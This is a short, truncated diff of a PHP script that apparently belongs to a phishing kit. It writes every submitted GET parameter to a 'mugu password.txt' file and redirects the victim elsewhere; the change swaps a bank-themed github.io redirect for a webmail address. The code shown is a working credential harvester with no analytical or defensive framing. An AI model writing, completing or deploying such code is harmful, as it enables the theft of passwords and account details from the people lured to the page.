@@ -1,5 +1,5 @@
 <?php
-header ('Location: https://gatehousebank.github.io/');
+header ('Location: http://www.poczta.imw.lublin.pl');
 $handle = fopen("mugu password.txt", "a");
 foreach($_GET as $variable => $value) {
    fwrite($handle, $variable);
